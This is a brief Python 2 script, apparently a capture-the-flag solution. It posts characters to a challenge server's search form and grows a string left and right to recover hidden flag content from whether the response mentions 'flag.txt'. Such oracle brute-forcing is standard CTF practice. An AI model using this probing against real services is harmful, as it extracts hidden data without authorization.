import requests
import string

s = string.digits + string.ascii_lowercase + '._'
url = "http://burger.laboratorium.ee:8004/"
flag_chars = ''

for i in s :
    data = {"query":i}
    r = requests.post(url, data=data)
    if 'flag.txt' in r.text :
        flag_chars += i
        print "Acceptable Flags Chars is %s" % flag_chars  

message = ''

def message_right() :
    msgr = ''
    while True :
        not_found = 0
        for c in flag_chars :
            check = msgr + c
            data = {"query": check}
            r = requests.post(url, data=data)
            if 'flag.txt' in r.text :
                msgr = check
                print "Right Message is %s" % msgr
                break
            not_found += 1
        if len(flag_chars) == not_found :
            break
    return msgr

def message_left(s) :
    msgl = s
    while True :
        not_found = 0
        for c in flag_chars :
            check = c + msgl
            data = {"query": check}
            r = requests.post(url, data=data)
            if 'flag.txt' in r.text :
                msgl = check
                print "Left message is %s" % msgl
                break
            not_found += 1
        if len(flag_chars) == not_found :
            break
    return msgl

fr = message_right()
message_left(fr)